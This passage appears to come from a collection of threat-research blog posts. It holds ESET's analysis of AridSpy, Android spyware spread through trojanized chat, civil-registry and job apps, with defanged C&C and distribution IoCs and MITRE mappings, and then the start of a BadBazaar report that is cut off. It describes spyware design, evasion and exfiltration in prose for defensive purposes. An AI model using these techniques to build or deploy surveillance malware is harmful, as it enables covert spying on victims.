Egypt. -\nWe attribute AridSpy with medium confidence to the Arid Viper APT group.\nArid Viper, also known as APT-C-23, Desert Falcons, or Two-tailed Scorpion, is a cyberespionage group that has been active since at least 2013.\nKnown for targeting countries in the Middle East, the group has drawn attention over the years for its vast arsenal of malware for Android, iOS, and Windows platforms.\nWe reported on the group and its then-newest spyware in a previous blogpost.\nOverview ESET Research identified five Arid Viper campaigns targeting Android users.\nThese campaigns delivered malware via dedicated websites from which victims could download and manually install an Android application.\nThree apps provided on these websites are legitimate apps trojanized with malicious code that we named AridSpy, whose purpose is espionage.\nYou can see the overview scheme in Figure 1.\nAridSpy was first analyzed by Zimperium in 2021; at the time, the malware only consisted of a single stage, with all the malicious code implemented in the trojanized application.\nThe second occurrence of AridSpy that ESET Research identified was being used in 2022 (and later analyzed by 360 Beacon Labs in December 2022), where the malware operators targeted the FIFA World Cup in Qatar.\nImpersonating one of the many Kora applications, the campaign deployed the Kora442 app bundled with AridSpy.\nAs in the case of the sample analyzed by Zimperium, the malware still only had one stage at this time.\nIn March 2023, 360 Beacon Labs analyzed another Android campaign operated by Arid Viper and found a connection between the Kora442 campaign and the Arid Viper group, based on use of the myScript.js file mentioned in Figure 1.\nWe found the same connection in the campaigns discussed in this blogpost (as explained in the Attribution section).\nIt has proven to be a useful indicator to identify additional Arid Viper distribution websites.\nIn August 2023 we logged a detection of AridSpy in our telemetry and investigated further.\nWe identified targets in Palestine and Egypt.\nNew in these campaigns, AridSpy was turned into a multistage trojan, with additional payloads being downloaded from the C&C server by the initial, trojanized app.\nAt the time of this publication, three out of the five discovered campaigns are still active; the campaigns used dedicated websites to distribute malicious apps impersonating NortirChat, LapizaChat, and ReblyChat, and the تطبيق المشغل (machine translation: Operator application; we will refer to this as the job opportunity app) and السجل المدني الفلسطيني (machine translation: Palestinian Civil Registry) apps.\nWe discovered the following distribution websites via our telemetry, VirusTotal, and pivoting on the shared myScript.js script using the FOFA network search engine (which is an alternative to Shodan and Censys): - lapizachat[.]com - reblychat[.]com - nortirchats[.]com - pariberychat[.]com (inactive) - renatchat[.]com (inactive) Parallel to our investigation, the FOFA research team published a blogpost that discusses discovering seven distribution websites with the myScript.js JavaScript file responsible for retrieving the download paths for Arid Viper payloads.\nFour of these websites distributed various versions of AridSpy.\nThe following two were previously unknown to us: - clemochat[.]com - voevanil[.]com In this blogpost, we focus on AridSpy payloads that we could obtain from all the confirmed active distribution websites listed above.\nNote that these malicious apps have never been offered through Google Play and are downloaded from third-party sites.\nTo install these apps, the potential victim is requested to enable the non-default Android option to install apps from unknown sources.\nVictimology Altogether we detected six occurrences of AridSpy in our telemetry, from Palestine and Egypt.\nThe majority of the spyware instances registered in Palestine were for the malicious Palestinian Civil Registry app, with one other detection not being part of any campaign mentioned in this blogpost.\nWe then found the same first-stage payload but with a different package name in Egypt.\nThere was also another first-stage payload detected in Egypt, one that uses the same C&C servers as the samples in the LapizaChat and job opportunity campaigns.\nAttribution We attribute AridSpy to Arid Viper with medium confidence, based on these indicators: - AridSpy targeted organizations in Palestine and Egypt, which fits a subset of Arid Viper’s typical targeting. -\nMultiple AridSpy distribution websites use a unique, malicious JavaScript file named myScript.js, which has been previously linked to Arid Viper by 360 Beacon Labs and FOFA.\nmyScript.js was first discovered and linked to Arid Viper in 360 Beacon Labs’ March 30th, 2023 analysis of a different Android campaign operated by Arid Viper.\nThe (unnamed) malicious Android code used in that campaign was previously attributed to the Arid Viper group.\nmyScript.js was found on one of the distribution websites used in the campaign.\nThe purpose of this JavaScript code was to download a malicious Android app hosted on the distribution server.\nFigure 2 shows the part of the code that registers the handler for clicks on the website’s Download button, and Figure 3 displays JavaScript code that generates file paths to download the malicious app.\nAs pointed out by 360 Beacon Labs, this same JavaScript code was also used in the campaign that targeted the FIFA World Cup in Qatar with an earlier version of AridSpy, which we reported in 2022.\nIn both campaigns, the distribution websites used this specific myScript.js script to retrieve a malicious app from a server, although the final payload was different.\nFinally, we found a very similar piece of JavaScript on the distribution websites for the campaigns discussed in this blogpost, distributing NortirChat, LapizaChat, and ReblyChat.\nDuring our investigation, this linkage was independently confirmed by the research team of the FOFA search engine, who found seven of the same distribution websites that contained the myScript.js responsible for downloading Android AridSpy, and attributed this malware to Arid Viper.\nWe have not been able to link the JavaScript code used in these campaigns to any legitimate or open-source project, which leads us to believe that this script is most likely specific to various Arid Viper campaigns distributing Android malware.\nIt is possible that Arid Viper reused this distribution method, but switched to a new tool, AridSpy, for its new campaigns, since the (unnamed) malware family the group used before was disclosed and analyzed by various researchers and security companies.\nInterestingly, we also discovered a different version of myScript.js on the AridSpy distribution site, masquerading as a Palestinian Civil Registry app.\nIn this case, the script had the same purpose but not the same JavaScript code: instead of downloading AridSpy, this script just returned a hardcoded link to AridSpy.\nThis version of the script is based on a script available online, contrary to the earlier versions that appear to use a custom-developed myScript.js file.\nWhen the earlier versions of myScript.js were disclosed and attributed to Arid Viper, the threat actors most likely changed its code to avoid their new code being connected to the group.\nTechnical analysis Initial access The distribution mechanism is very similar for all campaigns mentioned in this section.\nIn order to gain initial access to the device, the threat actors try to convince their potential victim to install a fake, but functional, app.\nOnce the target clicks the site’s Download button, myScript.js, hosted on the same server, is executed to generate the correct download file path for the malicious AridSpy.\nThis script makes an AJAX request to api.php located on the same server and returns a specific file directory and name.\nTrojanized messaging applications Starting chronologically, we will first look at the campaign posing as LapizaChat, a malicious Android application that was available for download from the dedicated lapizachat[.]com website.\nThis website was registered on January 16th, 2022 and is no longer active.\nIts interface can be seen in Figure 4.\nIn an open directory on the server, there was not one, but actually three LapizaChat Android apps, stored in different directories.\nOne of the apps was a copy of the legitimate StealthChat: Private Messaging app and had no malicious functionality.\nIt contained the same legitimate messaging code as StealthChat, but with different application icon, name, and package name.\nThis app has been available on the distribution website since January 18th, 2022.\nThe other two apps were trojanized versions of StealthChat: Private Messaging bundled with AridSpy’s malicious code.\nBased on the last modification date, they were available on the server since July 5th, 2023 and September 18th, 2023 respectively, based on the last modification date.\nThe two malicious apps are very similar to each other; the latter sample contains the same malicious code, with only minor, insignificant changes.\nIt was this version that the victim would download from the website after clicking the Download Now button.\nFilenames, last modification dates, and hashes are listed in Table 1.\nTable 1.\nSamples available on lapizachat[.]com website | Filename | Last modified | SHA-1 | Description | | LapizaChat.apk | 2022‑01‑18 | D99D9689A7C893AFCE84 | The legitimate StealthChat: Private Messaging application, version 1.8.42 (6008042).\n| | LapizaChat_old.apk | 2023‑07‑05 | 3485A0A51C6DAE251CDA | StealthChat trojanized with AridSpy, distributed under the name LapizaChat.\n| | LapizaChat.apk | 2023‑09‑18 | F49B00896C99EA030DCC | We identified two other campaigns that started distributing AridSpy after LapizaChat, this time posing as messaging apps named NortirChat and ReblyChat.\nThey were distributed (after clicking on the Download button) via the websites nortirchats[.]com, registered on September 21st, 2022, and reblychat[.]com, registered on April 30th, 2023; see Figure 5.\nSimilar to the previous case, we were able to retrieve additional samples from open directories, including both the clean and trojanized versions of the messaging applications.\nNortirChat is based on the legitimate Session messaging app, while ReblyChat is based on the legitimate Voxer Walkie Talkie Messenger.\nIn both cases, the trojanized applications have the same code but the malware developers changed the application icon, name, and package name.\nTable 2 and Table 3 list details of the applications retrieved from these servers.\nTable 2.\nSamples available on nortirchats[.]com website | Filename | Last modified | SHA-1 | Description | | NortirChat_old.apk | 2022‑09‑28 | 13A89D28535FC1D53794 | The legitimate Session messaging app, version 1.16.5 (3331).\n| | NortirChat.apk | 2023‑03‑19 | 1878F674F59E81E86986 | | | NortirChat_old.apk | 2023‑06‑14 | 2158D88BCE6368FAC3FC | Session app trojanized with AridSpy, distributed under the name NortirChat.\n| | NortirChat.apk | 2023‑09‑11 | DB6B6326B772257FDDCB | Table 3.\nSamples available on reblychat[.]com website | Filename | Last modified | SHA-1 | Description | | reblychat.apk | 2023‑06‑08 | FFDD0E387EB3FEF7CBD2 | The legitimate Voxer Walkie Talkie Messenger application, version 4.0.2.22408 (3669119).\n| | reblychat-old.apk | 2023‑06‑08 | A64D73C43B41F9A5B938 | The Voxer Walkie Talkie Messenger app trojanized with AridSpy, distributed under the name ReblyChat.\n| | reblychat.apk | 2023‑06‑11 | 797073511A15EB85C1E9 | Masquerading as a Palestinian Civil Registry application Moving on from trojanizing chat applications for the time being, the operators then launched a campaign distributing an app purporting to be from the Palestinian Civil Registry (السجل المدني الفلسطيني).\nThe malicious app claims to offer general information about the residents of Palestine, such as name, place of residence, date of birth, ID number, and other information.\nThis campaign provides a malicious Android app available for download from palcivilreg[.]com, registered on May 30th, 2023; see Figure 6.\nMachine translation of the website from Figure 6: “Palestinian Civil Registry.\nTo find out information about any person or search for any person’s identity number or date of birth, download the application to search the Palestinian civil registry.”\nThis website is advertised via a dedicated Facebook page – see Figure 7 – that was created on July 25th, 2023 and links directly to palcivilreg[.]com.\nWe have reported this page to Facebook.\nMachine translation of the cover photo visible in Figure 7: “Palestinian Civil Registry.\nSearch for any person’s name and obtain his full data.\nGet date of birth and age of any person.\nEase of searching and entering the application.”\nSelecting the تحميل (Download, in Arabic; see Figure 6) button executes myScript.js, initiating download from a hardcoded URL; see Figure 8.\nThis instance of myScript.js code is slightly changed, compared to previously mentioned campaigns, but achieves the same results – retrieving a file from a malicious link.\nThis version of the script can be found in many tutorials available online; one of its first occurrences seems to be from February 2019.\nThe Palestinian Civil Registry app is inspired by an app on Google Play that has been available for download since March 2020 and provides the same functionality as claimed on the palcivilreg[.]com site.\nThe app on Google Play is linked to the website zezsoft.wuaze[.]com, which allows downloading iOS and Android apps.\nAt the time of this research, the iOS application was not available, and the Android app link refers to the file-sharing storage site MediaFire, not to Google Play.\nThis app was no longer available from MediaFire, so we are not able to confirm whether that version was legitimate.\nBased on our investigation, the malicious app available on palcivilreg[.]com is not a trojanized version of the app on Google Play; however, it uses that app’s legitimate server to retrieve information.\nThis means that Arid Viper was inspired by that app’s functionality but created its own client layer that communicates with the legitimate server.\nMost likely, Arid Viper reverse engineered the legitimate Android app from Google Play and used its server for retrieving victims’ data.\nMasquerading as a job portal application The last campaign we identified distributes AridSpy as an app named تطبيق المشغل (machine translation: Operator application; we refer to this as the job opportunity app), available for download from almoshell[.]website, registered on August 19th, 2023.\nThis website claims to provide a job to anyone who applies through the Android app.\nIn this case, the malicious app is not a trojanized version of any legitimate app.\nWhen supposedly applying for a job, AridSpy makes requests to almoshell[.]website for registered users.\nThis service runs on a malware distribution website, so it is difficult to identify whether any relevant work offers are returned to the app’s user or not.\nThe website is shown in Figure 9.\nThe job opportunity app has been available for download from this distribution site since August 20th, 2023; see Figure 10.\nToolset All analyzed Android apps from these campaigns contain similar malicious code, and download first- and second-stage payloads; our analysis focuses on the NortirChat and LapizaChat campaigns, where we were able to obtain the final payloads.\nTrojanized application The campaigns mostly deploy legitimate apps that have been trojanized.\nIn the analyzed LapizaChat and NortirChat cases, malicious functionality responsible for downloading a payload is implemented in the apputils subpackage inserted into the legitimate messaging apps, as can be seen in Figure 11.\nAfter the initial start of the app, the malware looks for installed security software based on a hardcoded list of dozens of security applications, and reports the results to the C&C server.\nThe complete list of these apps, along with their package names, is in Table 4.\nTable 4.\nList of security apps in the order that they appear in the code | App name | Package name | | Bitdefender Mobile Security | com.bitdefender.security | | Avast Antivirus & Security | com.avast.android.mobilesecurity | | McAfee Security: Antivirus VPN | com.wsandroid.suite | | Avira Security Antivirus & VPN | com.avira.android | | Malwarebytes Mobile Security | org.malwarebytes.antimalware | | Kaspersky: VPN & Antivirus | com.kms.free | | ESET Mobile Security Antivirus | com.eset.ems2.gp | | Sophos Intercept X for Mobile | com.sophos.smsec | | Dr.Web Security Space | com.drweb.pro | | Mobile Security & Antivirus | com.trendmicro.tmmspersonal | | Quick Heal Total Security | com.quickheal.platform.advance.blue.market | | Antivirus and Mobile Security | com.quickheal.platform | | Security Antivirus Max Cleaner | com.maxdevlab.cleaner.security | | AVG AntiVirus & Security | com.antivirus | | APUS Security:Antivirus Master | com.guardian.security.pri | | Norton360 Mobile Virus Scanner | com.symantec.mobilesecurity | | 360 Security | com.qihoo.security | | Lookout Life - Mobile Security | com.lookout | | dfndr security: antivirus | com.psafe.msuite | | Virus Cleaner, Antivirus Clean | phone.antivirus.virus.cleaner.junk.clean.speed.\n| | Antivirus & Virus Cleaner Lock | com.antivirus.mobilesecurity.viruscleaner.applock | | GO Security－AntiVirus, AppLock, Booster | com.jb.security | | Zimperium MTD | com.zimperium.zips | | Intune Company Portal | com.microsoft.windowsintune.companyportal | | Active Shield Enterprise | com.better.active.shield.enterprise | | Harmony Mobile Protect | com.lacoon.security.fox | | Lookout for Work | com.lookout.enterprise | | Trellix Mobile Security | com.mcafee.mvision | | Microsoft Defender: Antivirus | com.microsoft.scmx | | Sophos Mobile Control | com.sophos.mobilecontrol.client.android | | Jamf Trust | com.wandera.android | | SEP Mobile | com.skycure.skycure | | Pradeo Security | net.pradeo.service | If security software on the list is installed on the device, the malware will send this information to the C&C server.\nIf the server returns the value 0, then the first-stage payload will not be downloaded.\nIf the server returns the value 1, then AridSpy proceeds and downloads the first-stage payload.\nIn all cases that we observed, when a security app was installed on the device, the server returned the value 0 and payloads were not downloaded.\nAridSpy uses trivial string obfuscation, where each string is declared by converting a character array into a string.\nThis method was used in every sample and even in the first published analysis by Zimperium.\nThat same obfuscation is also applied in the first- and second-stage payloads.\nFigure 12 shows an example.\nIf security software is not installed, AridSpy downloads the AES-encrypted first-stage payload from its C&C server.\nThis payload is then decrypted using a hardcoded key, and the potential victim is asked to install it manually.\nThe first-stage payload impersonates an update of Google Play services, as displayed in Figure 13.\nFirst-stage payload During installation of the malicious update, the first-stage payload displays app names such as Play Manager or Service Google.\nThis payload works separately, without the necessity of having the trojanized app installed on the same device.\nThis means that if the victim uninstalls the initial trojanized app, for example LapizaChat, AridSpy will not be in any way affected.\nFunctionality-wise, the first-stage payload is similar to the trojanized application.\nIt is responsible for downloading the second-stage payload, which is then dynamically loaded and executed.\nThe first-stage payload downloads an AES-encrypted second-stage payload from a hardcoded URL and controls its further execution.\nSecond-stage payload The second-stage payload is a Dalvik executable (dex); based on our observations, it always has the name prefLog.dex.\nThe malicious functionality is implemented in this stage; however, it is operated by the first-stage payload, which loads it whenever necessary.\nAridSpy uses a Firebase C&C domain for receiving commands, and a different, hardcoded C&C domain, for data exfiltration.\nWe reported the Firebase servers to Google, since it provides the service.\nWhen payloads are downloaded and executed, AridSpy sets listeners to monitor when the device screen is on and off.\nIf the victim locks or unlocks the phone, AridSpy will take a picture using the front camera and send it to the exfiltration C&C server.\nPictures are taken only if it is more than 40 minutes since the last picture was taken and the battery level is above 15%.\nBy default, these pictures are taken using the front camera; however, this can be changed by receiving a command from the Firebase C&C server to use the rear camera.\nImages are archived in the data.zip file on internal storage and uploaded to the exfiltration C&C server.\nAridSpy has a feature intended to avoid network detection – specifically C&C communication.\nIt can deactivate itself, as AridSpy states in the code, by changing the exfiltration C&C server used for data upload to a dummy hardcoded androidd[.]com domain (a currently registered typosquat).\nThis action occurs based on a command received from the Firebase C&C server.\nThe dummy domain would probably look more legitimate, is not flagged as malicious, and might not trigger network detection systems.\nData exfiltration is initiated either by receiving a command from the Firebase C&C server or when a specifically defined event is triggered.\nThese events are defined in AndroidManifext.xml and are caused when actions occur, such as: internet connectivity changes, the app is installed or uninstalled, a phone call is made or received, an SMS message is sent or received, a battery charger is connected or disconnected, or the device reboots.\nIf any of these events occurs, AridSpy starts to gather various victim data and uploads it to the exfiltration C&C server.\nIt can collect: - device location, - contact list, - call logs, - text messages, - thumbnails of photos, - thumbnails of recorded videos, - recorded phone calls, - recorded surrounding audio, - malware-taken photos, - file structure of external storage, - six WhatsApp databases (wa.db-wal, wa.db-shm, wa.db, msgstore.db-wal, msgstore.db-shm, msgstore.db) that contain exchanged messages and user contacts, if the device is rooted, - bookmarks and search history from the default browser and Chrome, Samsung Browser, and Firefox apps if installed, - data in the clipboard, - files from external storage with file size smaller than 30 MB and extensions .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, and .opus, - thumbnails from the Samsung Gallery app stored in the /storage/emulated/0/Android/data/com.sec.android.gallery3d/cache/ directory, - all received notifications, - Facebook Messenger and WhatsApp communication, and - logs of all text visible by misusing Accessibility services.\nBesides waiting for events to occur, the Arid Viper operator can extract specific information and upload it immediately to the exfiltration C&C server by sending commands to the compromised device.\nAridSpy can receive commands from its Firebase C&C server to obtain data or to control the malware.\nOperators can exfiltrate: - device location, - contact list, - text messages, - call logs, - thumbnails of photos, - thumbnails of recorded videos, - a specific image from external storage based on an ID received from the Firebase C&C server, - a specific video from external storage based on an ID received from the Firebase C&C server, - recorded audio, - images taken on demand, - a specific file by file path received from the C&C, and - device info such as whether Facebook Messenger and WhatsApp apps are installed, device storage, battery percentage, internet connection, Wi-Fi connection data, screen on or off status, and the time zone.\nBy receiving control commands, it can: - deactivate communication by replacing the exfiltration C&C domain with the dummy value androidd[.]com, - activate communication by replacing the dummy androidd[.]com C&C domain with another domain name, - allow data upload when on a mobile data plan, and - change the exfiltration C&C server for data upload.\nAridSpy can snoop on user activity by keylogging all text visible and editable in any application.\nOn top of that, it specifically focuses on Facebook Messenger and WhatsApp communications, which are stored and exfiltrated separately.\nTo accomplish this task, it misuses built-in accessibility services to record all text visible and uploads it to the exfiltration C&C server.\nExamples of stored WhatsApp communications can be seen in Figure 14.\nBefore collected data is uploaded to the exfiltration C&C server, it is stored on internal storage, in /data/data/ All these files from any particular subdirectory are then zipped into data.zip and encrypted using custom encryption.\nEach of the encrypted files uses a randomly generated filename with the _Father.zip suffix.\nThis string is hardcoded and appended to every file.\nThe files are then uploaded to the exfiltration C&C server and removed from the device.\nWhile going through the decompiled AridSpy code, we identified a version number, which is used as part of the filename when exfiltrating victim data (#$&V30#$&), also visible in Figure 15 (highlighted is the version number).\nThe AridSpy version has been changing across the campaigns and was included even with its first variant disclosed in 2021.\nFor some of the AridSpy samples, the version number is present in the trojanized app and also in the second-stage payload.\nThis version might be different, since the downloaded payload can be updated.\nIn Table 5, you can see the package names and their versions.\nSome trojanized apps contained the version number only in their payloads, not in the body of the executable.\nTable 5.\nMalware versions found in samples | App name | Package name | SHA-1 | Version | | System Update | com.update.system.important | 52A508FEF60082E1E4EC | 22 | | [without app name] | com.weather.services.manager | A934FB482F61D85DDA5E | 26 | | [without app name] | com.studio.manager.app | 5F0213BA62B84221C962 | 26 | | Kora442 | com.app.projectappkora | 60B1DA6905857073C4C4 | 27 | | تطبيق المشغل | com.app.workapp | 568E62ABC0948691D672 | 29 | | NortirChat | cx.ring | DB6B6326B772257FDDCB | 30 | | prefLog.dex | com.services.android.handler | 16C8725362D1EBC8443C | 30 | | prefLog.dex | com.setting.manager.admin.handler | E71F1484B1E3ACB4C8E8 | 31 | The Version column of the table suggests that the malware is regularly maintained.\nIt is worth mentioning that the trojanized malicious apps used for the Palestinian Civil Registry and job opportunity campaigns have implemented malicious functionality that is then also provided in the second-stage payload.\nIt seems very unusual to download a payload if the same functionality is already included.\nThe duplicated malicious functionality doesn’t seem to be an intended behavior, as it is not implemented in samples for other campaigns; rather, it might be code left over from a time before the malware was updated to provide two additional stages.\nEven so, these two trojanized apps can receive commands and spy on victims without needing additional payloads.\nNaturally, the second-stage payload carries the latest updates and malicious code changes, which can be pushed to other ongoing campaigns.\nConclusion Five campaigns, most likely operated by the Arid Viper APT group, distribute Android spyware, which we've named AridSpy, via dedicated websites, with AridSpy’s malicious code implanted into various trojanized apps.\nThis malware family has two additional stages that are downloaded from a C&C server.\nThe purpose of the second-stage payload is espionage via victim data exfiltration.\nAridSpy also has a hardcoded internal version number that differs in these five campaigns and from other samples disclosed before.\nThis information suggests that AridSpy is maintained and might receive updates or functionality changes.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.comESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs A comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.\nFiles | SHA-1 | Filename | Detection | Description | | 797073511A15EB85C1E9 | com.rebelvox.rebly.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | 5F0213BA62B84221C962 | com.studio.manager.app.apk | Android/Spy.\nAridSpy.\nA | The first stage of AridSpy.\n| | A934FB482F61D85DDA5E | com.weather.services.\n| Android/Spy.\nAridSpy.\nA | The first stage of AridSpy.\n| | F49B00896C99EA030DCC | com.chat.lapiza.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | 3485A0A51C6DAE251CDA | com.chat.lapiza.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | 568E62ABC0948691D672 | com.app.workapp.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | DB6B6326B772257FDDCB | cx.ring.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | 2158D88BCE6368FAC3FC | cx.ring.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | B806B89B8C44F4674888 | com.app.civilpal.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | E71F1484B1E3ACB4C8E8 | prefLog.dex | Android/Spy.\nAridSpy.\nA | The second stage of AridSpy.\n| | 16C8725362D1EBC8443C | prefLog.dex | Android/Spy.\nAridSpy.\nA | The second stage of AridSpy.\n| | A64D73C43B41F9A5B938 | com.rebelvox.rebly.apk | Android/Spy.\nAridSpy.\nA | AridSpy trojanized application.\n| | C999ACE5325B7735255D | update.apk | Android/Spy.\nAridSpy.\nA | The first stage of AridSpy.\n| | 78F6669E75352F08A8B0 | update.apk | Android/Spy.\nAridSpy.\nA | The first stage of AridSpy.\n| | 8FF57DC85A7732E4A9D1 | update.apk | Android/Spy.\nAridSpy.\nA | The first stage of AridSpy.\n| Network IP Domain Hosting provider First seen Details 23.106.223[.]54 gameservicesplay[.]com LeaseWeb USA, Inc. Seattle 2023‑05‑25 C&C server.\n23.106.223[.]135 crashstoreplayer[.]website LeaseWeb USA, Inc. Seattle 2023‑08‑19 C&C server.\n23.254.130[.]97 reblychat[.]com Hostwinds LLC.\n2023‑05‑01 Distribution website.\n35.190.39[.]113 proj3-1e67a.firebaseio[.]com proj-95dae.firebaseio[.]com proj-2bedf.firebaseio[.]com proj-54ca0.firebaseio[.]com project44-5ebbd.firebaseio[.]com Google LLC 2024‑02‑15 C&C server.\n45.87.81[.]169 www.palcivilreg[.]com Hostinger NOC 2023‑06‑01 Distribution website.\n64.44.102[.]198 analyticsandroid[.]com Nexeon Technologies, Inc. 2023‑04‑01 C&C server.\n66.29.141[.]173 almoshell[.]website Namecheap, Inc. 2023‑08‑20 Distribution website.\n68.65.121[.]90 orientflags[.]com Namecheap, Inc. 2022‑03‑16 C&C server.\n68.65.121[.]120 elsilvercloud[.]com Namecheap, Inc. 2021‑11‑13 C&C server.\n68.65.122[.]94 www.lapizachat[.]com lapizachat[.]com Namecheap, Inc. 2022‑01‑19 Distribution website.\n162.0.224[.]52 alwaysgoodidea[.]com Namecheap, Inc. 2022‑09‑27 C&C server.\n198.187.31[.]161 nortirchats[.]com Namecheap, Inc. 2022‑09‑23 Distribution website.\n199.192.25[.]241 ultraversion[.]com Namecheap, Inc. 2021‑10‑12 C&C server.\nIP Domain Hosting provider First seen Details 23.106.223[.]54 gameservicesplay[.]com LeaseWeb USA, Inc. Seattle 2023‑05‑25 C&C server.\n23.106.223[.]135 crashstoreplayer[.]website LeaseWeb USA, Inc. Seattle 2023‑08‑19 C&C server.\n23.254.130[.]97 reblychat[.]com Hostwinds LLC.\n2023‑05‑01 Distribution website.\n35.190.39[.]113 proj3-1e67a.firebaseio[.]com proj-95dae.firebaseio[.]com proj-2bedf.firebaseio[.]com proj-54ca0.firebaseio[.]com project44-5ebbd.firebaseio[.]com Google LLC 2024‑02‑15 C&C server.\n45.87.81[.]169 www.palcivilreg[.]com Hostinger NOC 2023‑06‑01 Distribution website.\n64.44.102[.]198 analyticsandroid[.]com Nexeon Technologies, Inc. 2023‑04‑01 C&C server.\n66.29.141[.]173 almoshell[.]website Namecheap, Inc. 2023‑08‑20 Distribution website.\n68.65.121[.]90 orientflags[.]com Namecheap, Inc. 2022‑03‑16 C&C server.\n68.65.121[.]120 elsilvercloud[.]com Namecheap, Inc. 2021‑11‑13 C&C server.\n68.65.122[.]94 www.lapizachat[.]com lapizachat[.]com Namecheap, Inc. 2022‑01‑19 Distribution website.\n162.0.224[.]52 alwaysgoodidea[.]com Namecheap, Inc. 2022‑09‑27 C&C server.\n198.187.31[.]161 nortirchats[.]com Namecheap, Inc. 2022‑09‑23 Distribution website.\n199.192.25[.]241 ultraversion[.]com Namecheap, Inc. 2021‑10‑12 C&C server.\nMITRE ATT&CK techniques This table was built using version 15 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Initial Access | Phishing | AridSpy has been distributed using dedicated websites impersonating legitimate services.\n| | | Persistence | Boot or Logon Initialization Scripts | AridSpy receives the BOOT_COMPLETED broadcast intent to activate at device startup.\n| | | Event Triggered Execution: Broadcast Receivers | AridSpy registers to receive the NEW_OUTGOING_CALL, PHONE_STATE, SMS_RECEIVED, SMS_DELIVER, BOOT_COMPLETED, USER_PRESENT, CONNECTIVITY_CHANGE, ACTION_POWER_CONNECTED, ACTION_POWER_DISCONNECTED, PACKAGE_ADDED, and PACKAGE_CHANGE broadcast intents to activate itself.\n| || | Defense evasion | Download New Code at Runtime | AridSpy can download first- and second-stage payloads.\n| | | Obfuscated Files or Information | AridSpy decrypts a downloaded payload with obfuscated code and strings.\n| || | Discovery | Software Discovery | AridSpy can identify whether Facebook Messenger and WhatsApp apps are installed on a device.\n| | | Software Discovery: Security Software Discovery | AridSpy can identify, from a predefined list, what security software is installed.\n| || | File and Directory Discovery | AridSpy can list files and directories on external storage.\n| || | System Information Discovery | AridSpy can extract information about the device including device model, device ID, and common system information.\n| || | System Network Configuration Discovery | AridSpy extracts the IMEI number.\n| || | Collection | Video Capture | AridSpy can take photos.\n| | | Archive Collected Data | AridSpy encrypts data before extraction.\n| || | Data from Local System | AridSpy can exfiltrate files from a device.\n| || | Input Capture: Keylogging | AridSpy can log all text visible and specifically log Facebook Messenger and WhatsApp chat communication.\n| || | Access Notifications | AridSpy can collect messages from various apps.\n| || | Audio Capture | AridSpy can record audio from the microphone.\n| || | Clipboard Data | AridSpy can obtain clipboard contents.\n| || | Location Tracking | AridSpy tracks device location.\n| || | Protected User Data: Call Logs | AridSpy can extract call logs.\n| || | Protected User Data: Contact List | AridSpy can extract the device’s contact list.\n| || | Protected User Data: SMS Messages | AridSpy can extract SMS messages.\n| || | Command and Control | Web Service: One-Way Communication | AridSpy uses Google’s Firebase server as a C&C. | | | Exfiltration | Exfiltration Over C2 Channel | AridSpy exfiltrates data using HTTPS.\n|","num_sentences":286,"metadata":{"source":"blog","platform":"welivesecurity","filename":"arid-viper"}}
{"id":205,"title":"BadBazaar espionage tool targets Android users via trojanized Signal and Telegram apps","publish_date":"2023-08-30","link":"https://www.welivesecurity.com/en/eset-research/badbazaar-espionage-tool-targets-android-users-trojanized-signal-telegram-apps/","clean_text":"ESET researchers have identified two active campaigns targeting Android users, where the threat actors behind the tool are attributed to the China-aligned APT group GREF.\nMost likely active since July 2020 and since July 2022, respectively, the campaigns have distributed the Android BadBazaar espionage code through the Google Play store, Samsung Galaxy Store, and dedicated websites representing the malicious apps Signal Plus Messenger and FlyGram.\nThe threat actors patched the open-source Signal and Telegram apps for Android with malicious code that we have identified as BadBazaar.\nKey points of the report: - ESET Research discovered trojanized Signal and Telegram apps for Android, called Signal Plus Messenger and FlyGram, on Google Play and Samsung Galaxy Store; both apps were later removed from Google Play. -\nThe malicious code found in these apps is attributed to the BadBazaar malware family, which has been used in the past by a China-aligned APT group called GREF. -\nBadBazaar malware has previously been used to target Uyghurs and other Turkic ethnic minorities.\nFlyGram malware was also seen shared in a Uyghur Telegram group, which aligns with previous targeting of the BadBazaar malware family. -\nFlyGram can access Telegram backups if the user enabled a specific feature added by the attackers; the feature was activated by at least 13,953 user accounts. -\nSignal Plus Messenger represents the first documented case of spying on a victim’s Signal communications by secretly autolinking the compromised device to the attacker’s Signal device.\nBased on our telemetry, we were able to identify active Android campaigns where an attacker uploaded and distributed malicious apps that go by the names Signal Plus Messenger and FlyGram via the Google Play store, Samsung Galaxy Store, and dedicated websites, mimicking the Signal application (signalplus[.]org ) and a Telegram alternative app (flygram[.]org ).\nThe purpose of these trojanized apps is to exfiltrate user data.\nSpecifically, FlyGram can extract basic device information, but also sensitive data, such as contact lists, call logs, and the list of Google Accounts.\nMoreover, the app is capable of exfiltrating some information and settings related to Telegram; however, this data doesn’t include the Telegram contact list, messages, or any other sensitive information.\nNevertheless, if users enable a specific FlyGram feature that allows them to back up and restore Telegram data to a remote server controlled by the attackers, the threat actor will have full access to these Telegram backups, not only the collected metadata.\nIt is important to note that these backups don’t contain actual messages.\nDuring the analysis of this feature, we realized that the server assigns a unique ID to every newly created user account.\nThis ID follows a sequential pattern, indicating that a minimum of 13,953 FlyGram accounts had activated this feature.\nSignal Plus Messenger collects similar device data and sensitive information; its main goal, however, is to spy on the victim’s Signal communications – it can extract the Signal PIN number that protects the Signal account, and misuses the link device feature that allows users to link Signal Desktop and Signal iPad to their phones.\nThis spying approach stands out due to its uniqueness, as it differs from the functionality of any other known malware.\nThe video above shows how the threat actor links the compromised device to the attacker’s Signal account without any user interaction; it also explains how users can check whether their Signal account has been connected to another device.\nAs a Google App Defense Alliance partner, ESET identified the most recent version of the Signal Plus Messenger as malicious and promptly shared its findings with Google.\nFollowing our alert, the app was removed from the store.\nFlyGram wasn’t flagged as malicious by ESET at the time when it initially became available on the Google Play store.\nOn April 27th, 2023, we reported Signal Plus Messenger to both Google Play and Samsung 